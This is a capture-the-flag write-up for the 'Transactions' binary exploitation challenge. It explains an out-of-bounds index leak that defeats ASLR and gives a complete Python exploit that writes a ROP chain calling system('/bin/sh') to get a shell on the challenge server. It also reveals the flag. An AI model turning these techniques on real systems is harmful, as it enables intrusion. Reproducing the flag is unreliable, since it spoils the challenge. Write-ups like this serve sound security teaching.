# T̴̙̮͓̠̪̮̠́̅ͅr̢͈̯̪̬̣̻̓a̢̺̭̣͌ͯn̷̘̮̼͉̮͓̯̑s̵̟̪̞̘͂͗a̛͍̼͎̳̭̼̦̔̃͐ͅcͩ̈́̋̈͏̘̲ṱ̵̦̠̅͐ḯ̯̖̪̜̭̳̓̇̅̕ͅo̳̫̼͈̻͂̑͞n̓͌̂̑͏͙̙͇s̫͓͛́ [15]
Tags: Binary Exploitation

_Activating the panel, you spot a notification from your SieberrHealthTracker™:_

**`WARNING: Unusual levels of plasma lactate detected in the body. Please seek out the nearest SieberrHealth hospital soon...`**

_That can't be good._

The [Transactions panel](https://drive.google.com/uc?id=1p2qTzONfrK_Wx-IcspcqmoFQFevcL8UJ) doesn't have a stop button, but there has to be a way to stop this...

###### Clarification: the port and IP are unchanged; challs.sieberrsec.tech 51384

Hints:
0. (free) If you haven't done the first Transactions challenge, you should probably do that first. These hints are in hierarchical order: if one hint confuses you, you shouldn't buy the next one.
1. (1 point) You'll need to reach /bin/sh for this one.
2. (3 points) The challenge has no libc version attached for a reason (muse on this!), but if you think it'll be helpful: docker `ubuntu:20.04`.
3. (5 points) Wondering how to leak? I'm a big fan of assignment expressions, but I had to edit one out here :/

Files: `transactions`, with checksec:
```asm
[*] 'transactions'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

###### You might want to install [`pwnscripts`](https://github.com/152334H/pwnscripts) to try out the code in this writeup for yourself!

## Solving
Option 2 (`edit`) is all you need.

If you're experienced, the exploit chain should be pretty obvious here: after extending `humancount`, overwrite the return pointer stack for `main()` with a basic ROP-chain to call `system("/bin/sh")`.

The real meat of this challenge is in defeating ASLR, for which the 5 point hint comes into play. Consider this part of the program:
```c
prompt("How much should this patient be charged? ", &cost);
humans[opt] = cost;
printf("SieberrHealth has charged patient %d $%d!\n", opt, humans[opt]);
```
If you know what an assignment expression is, you'll know that the last two lines here could've been shortened to:
```c
printf("SieberrHealth has charged patient %d $%d!\n", opt, humans[opt] = cost);
```
Why is this so important? In order to leak an address, we need `printf()` to display a value that _wasn't_ edited by the user. In the line immediately above, this is impossible, because both given values are immediately manipulated by the user.

_With_ the separate assignment expression & statement, we can pull off a cool trick:
```c
humans[-4] = 106;
printf("SieberrHealth has charged patient %d $%d!\n", opt, humans[opt]);
```
`&opt == humans-4`. If we modify `opt`, `printf()` will print out whatever `humans[opt]` is pointing to, giving an Arbitrary Relative Leak.

Everything after that is really just paperwork, with the right amount of experience:
```python
from pwnscripts import *    # use pwnscripts-dev!
from re import findall
context.binary = 'transactions'
class Transactions(pwnlib.tubes.remote.remote):
    def choose(r, opt: int):
        r.recvuntil('kill all patients\n')
        r.sendlineafter('> ', str(opt))
    def edit(r, ind: int, val: int):
        r.choose(2)
        r.sendlineafter('to edit? ', str(ind))
        r.sendlineafter('be charged? ', str(val))
        return unpack(pack(int(findall(b'-?[0-9]+', r.recvline())[-1]),sign=True))
    def kill(r):
        r.choose(3)
        r.recvline()
        log.info('flag1: %s' % r.recvline())

r = Transactions('challs.sieberrsec.tech', 51384)
OFFSETS = {'humancount': -2, 'opt': -4, 'rsp': -4, 'ret': 106} # relative stack offsets from humans[]

# Here, we expect [rsp-0x8] to be <main+321>.
PIE_leak = r.edit(OFFSETS['opt'], OFFSETS['rsp']-1)
PIE_leak <<= context.bits//2
PIE_leak+= r.edit(OFFSETS['opt'], OFFSETS['rsp']-2)
assert is_addr.PIE(PIE_leak) # this has a decent chance of failing.
context.binary.symbols['main'] = PIE_leak-321   # auto-update base address

# Now, we'll setup a ROP-chain to call system("/bin/sh").
context.binary.symbols['scratch'] = context.binary.address+0x4500 # dumping ground for "/bin/sh".
R = ROP(context.binary)
R.prompt(*[context.binary.symbols['scratch']]*2)
R.prompt(*[context.binary.symbols['scratch']+context.bytes//2]*2)
R.raw(R.ret.address)    # MOVAPS issue
R.system(context.binary.symbols['scratch']) # system("/bin/sh")

# write the rop-chain
r.edit(OFFSETS['humancount'], 1<<30) # need this for forward indexing
for b in group(4, R.chain()):
    r.edit(OFFSETS['ret'], u32(b, sign='signed'))
    OFFSETS['ret'] += 1

# Get shell by quitting main()
r.kill()
r.sendline(str(u32(b'/bin', sign='signed')))
r.sendline(str(u32(b'/sh\0', sign='signed')))
r.interactive()
```
## Fun extra stuff
After getting a shell, there's one last thing you need to do:
```sh
[*] Switching to interactive mode
$ ls
SieberrHealth_WorldDomination.sh
bin
dev
flag
fun.c
lib
lib32
lib64
libx32
root
transactions
usr
```
Stop the plot-relevant world domination plan!
```sh
$ ./Sieberr*
./SieberrHealth_WorldDomination.sh - testing script for SieberrHealth
Options:
 -s: (s)top mass murder (why would we want this?)
 -g: enable mass (g)enocide (as is the plan)
$ ./Sieberr* -s
IRS{w0r1d_s@v3d}
$
```
So,
## Flag
`IRS{w0r1d_s@v3d}`